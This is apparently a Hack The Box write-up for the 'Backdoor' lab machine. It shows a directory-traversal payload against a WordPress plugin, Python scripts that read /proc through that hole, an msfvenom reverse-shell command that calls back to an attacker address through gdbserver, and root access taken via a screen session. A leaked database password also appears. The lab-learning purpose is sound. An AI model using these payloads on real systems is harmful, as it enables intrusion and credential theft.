# Backdoor Machine(10.10.11.125)

## Info:

This was an easy machine from hackthebox where we had to enumerate PIDs to find gdbserver to get foothold and attaching root's screen session to get root.
I learned about async programming due to this machine. Thanks to 0xdf and HTB for this machine.

![Backdoor](https://user-images.githubusercontent.com/79413473/165135257-deadc707-0ad1-45be-b948-a4faa6f4378f.png)

## Recon:

starting with port scan, first let's discover open ports then run nmap on them. `rustscan -a 10.10.11.125 -u 5000`. Rustscan sometime misses thing due to speed it's a good idea to run nmap full port scan in background `nmap -p- -T4 10.10.11.125`. 

```
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 22 is ssh, port 80 is running wordpress and 1337 is unknown. Connecting on port 1337 just hangs, let's run wireshark to see what's going on.

On connecting server just accept the connection with SYN,ACK. `nc 10.10.11.125 1337`

![Screenshot from 2022-04-25 22-29-59](https://user-images.githubusercontent.com/79413473/165137648-8fcb18a7-c8d4-419e-ad8e-7313ae996d74.png)

Let's send some data to it like `grabage_text`. Nothing happened server just acknowledged and kept the connection alive

![Screenshot from 2022-04-25 22-33-26](https://user-images.githubusercontent.com/79413473/165138104-331f2959-4c23-4058-82e0-7eef3d0ea764.png)

Let's move on to wordpress for now

![Screenshot from 2022-04-25 22-34-14](https://user-images.githubusercontent.com/79413473/165138227-7146c1a9-8682-4a83-8228-4bd4697077f7.png)


## Foothold: Exploiting Remote Debugging using gdb

Enumerating wordpress with wpscan finds that directory listing is enabled on */wp-content/uploads* which is deadend and identifies **admin** user.

![Screenshot from 2022-04-25 22-43-31](https://user-images.githubusercontent.com/79413473/165139615-4d530cdf-dc3a-45df-a171-22a63af1510d.png)

Also interesting directory is */wp-conten/plugins* strange part is that wpscan doesn't highlight that. Let's check it out.

![Screenshot from 2022-04-25 22-58-52](https://user-images.githubusercontent.com/79413473/165141957-173dcb0e-96cb-4e4f-b40c-d22664a3e2b3.png)

Now reading version from **ebook-download** plugin i.e. 1.1. There exist a vulnerability for this version. [Here](https://www.exploit-db.com/exploits/39575).

Look like there is directory-trvaersal vulnerability with bookdownload url.

```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```
this *filedownload.php* exist also in our plugin. Let's test it and it works

![Screenshot from 2022-04-25 23-03-21](https://user-images.githubusercontent.com/79413473/165142774-9f067ff3-be47-4673-978f-47260cef8269.png)

![Screenshot from 2022-04-25 23-03-11](https://user-images.githubusercontent.com/79413473/165142781-ca2c3308-14e7-4bf9-abca-b9174adc7d47.png)

From *wp-config.php* we got database password let's try to login on wordpress with this **admin:MQYBJSaD#DxG6qbm** in case password is reused.

It didn't work. I tried to ssh with this password and user `user` from /etc/passwd. As we have directory traversal we can always enumerate process on machine from */proc/PID/cmdline*

Now i wrote a script to do that for enumerating processes from 1 to 1000 and filter some garbage from output like `<script>window.close()</script>`.
You can do it same in bash as well easily.
```
#!/usr/bin/env python

import requests

for i in range(1,1000):
    param=f'../../../../../../proc/{i}/cmdline'
    r=requests.get('http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='+param)
    print(i,end=' ')
    print(r.text[3*len(param):-31])
```
![Screenshot from 2022-04-25 23-38-49](https://user-images.githubusercontent.com/79413473/165148335-671b7c89-312c-4914-b152-99be94953651.png)

Now this process is very tiring as it sends one request at a time and wait for it to finish then second task starts. But in asynchronous programming one task starts and allows next task to execute also and later they both can get their reponses back and resynchronize. 0xdf did this in a [video](https://www.youtube.com/watch?v=rn3R92y5Wlg). This is something which i also wanted to learn for a long time as this exact scenario i face very often. So i wanted to learn about multithreading in python to do tasks fatser.

*Ps: keep in mind multithreading and asynchronous isn't same thing,multithreading is one form of asynchronous programming you can read more [here](https://www.baeldung.com/cs/async-vs-multi-threading)*


Now i found [this](https://www.twilio.com/blog/asynchronous-http-requests-in-python-with-aiohttp) post about asynchronous requests. Well in python anything can be asynchronous. But saw my script was very fast compared to what i had before but i couln't read output instead my script was returning coroutine objects. I ended up consuming few videos and blogs also watched 0xdf video to figure out response.

Wrote this script *async_traverse.py*

```
#!/usr/bin/env python3


import aiohttp
import asyncio


async def fetch_process(session,x):
    
    param=f'../../../../../../proc/{x}/cmdline'
    url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='+param
    async with session.get(url) as resp:
        result = (await resp.text())[3*len(param):-31]
        if result:
            print(f"{x:5}: {result}")

async def main():

    async with aiohttp.ClientSession() as session:

        tasks = []
        for i in range(1, 1000):
            tasks.append(asyncio.ensure_future(fetch_process(session, i)))

        processes = await asyncio.gather(*tasks)
        
asyncio.run(main())
```

Now this script takes hardly 4 seconds to complete while previous one took more than 15 minutes on my computer. 

![Screenshot from 2022-04-26 01-41-24](https://user-images.githubusercontent.com/79413473/165167142-055fe727-e02f-45b7-8ddc-93e4c14b8af7.png)

Now ofcourse PID 912 stands out as this is what starting a listener on port 1337 with gdbserver. 

![Screenshot from 2022-04-26 01-42-55](https://user-images.githubusercontent.com/79413473/165167345-a4c12c46-d623-4a07-b69a-b5b317786fa2.png)

```
/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```
And that's why our port scan didn't pick port 1337 sometimes. As it's not something stable. But now we know what to do with port 1337.

Now, gdbserver is a computer program that makes it possible to remotely debug other programs. Let's figure out how to connect to a gdbserver.

From reading docs and [haktricks](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) page we can connect to a 
remote gdbserver using gdb remote mode and put a .elf file on system and execute it from gdb.

Create a reverse shell file

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
```
Run gdb in terminal with binary.elf, without it it won't work  `gdb -q binary.elf` Then connect to remote server

```
target extended-remote 10.10.11.125:1337
```

then put binary.elf file on server `remote put binary.elf binary.elf` then set which file you want to debug on remote system with 
`set remote exec-file /home/user/binary.elf`. Then `run` it. On you listener you will get a shell

![Screenshot from 2022-04-26 13-02-08](https://user-images.githubusercontent.com/79413473/165246298-5d9f12b7-080c-4d41-8d1c-aa551ceaccc9.png)

upgrade to ptty shell

## Privilege escaltion: Connecting to root's screen session

Now if you remember when we were enumerating processes ,there was one more interesting process running on server

```
851: /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```
We could have seen this in processes running too, `ps aux` 
Screen is a binary like tmux which can start multiple sessions from one window and preserve them in background. This command is continously using find command and executing screen in detached mode and session name is root.

Now if you run screen a new directory will be created in */var/run/screen/* i.e. S-user. Now if you create new session you will have new socket file in it. `screen -dms name -s /bin/bash`

![Screenshot from 2022-04-26 13-37-07](https://user-images.githubusercontent.com/79413473/165252766-f8963519-d7c6-44cf-9fdb-d7bba262d94e.png)

Now in order to list session of particlular user it needs a trailing `/` after username otherwise it doesn't show.

![Screenshot from 2022-04-26 13-39-19](https://user-images.githubusercontent.com/79413473/165253179-3b394855-bd10-4fd1-a799-4f520f9ee8ed.png)

0xdf showed that it is not possible to attach to other people sessions unless explicitly listed. After getting root we will see from file 
*/root/.screenrc* that user was allowed to connect to root's session.

```
multiuser on
acladd user
shell -/bin/bash
```

Now there are multile ways to connect to a detached session. We will use `screen -R`.

Let's list root's session `screen -ls root/`

![Screenshot from 2022-04-26 13-43-21](https://user-images.githubusercontent.com/79413473/165253949-b6e27c8e-8714-40c5-841d-e226ff0c9cf3.png)

let's connect to this session `screen -R root/25376` and we are root on backdoor machine.

![Screenshot from 2022-04-26 13-44-28](https://user-images.githubusercontent.com/79413473/165254237-df655cf4-7126-4710-ab8f-1811e78b8033.png)

Thank you for reading.

Twitter: [Avinashkroy](http://twitter.com/avinashkroy)

